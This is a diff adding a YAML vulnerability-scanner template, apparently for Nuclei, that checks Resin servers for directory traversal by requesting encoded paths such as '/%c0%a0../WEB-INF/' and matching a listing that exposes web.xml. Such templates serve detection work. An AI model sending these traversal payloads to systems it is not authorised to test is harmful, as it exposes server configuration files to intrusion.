@@ -1,0 +1,22 @@
+id: poc-yaml-resin-directory-traversal
+info:
+  name: Resin Directory Traversal Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: directory-traversal
+
+http:
+  - method: GET
+    path:
+      - "/%20../WEB-INF/"
+      - "/%c0%a0../WEB-INF/"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<li><a href='web.xml'>web.xml</a>"
+          - "<li><a href='web'>web</a>"
+        part: body
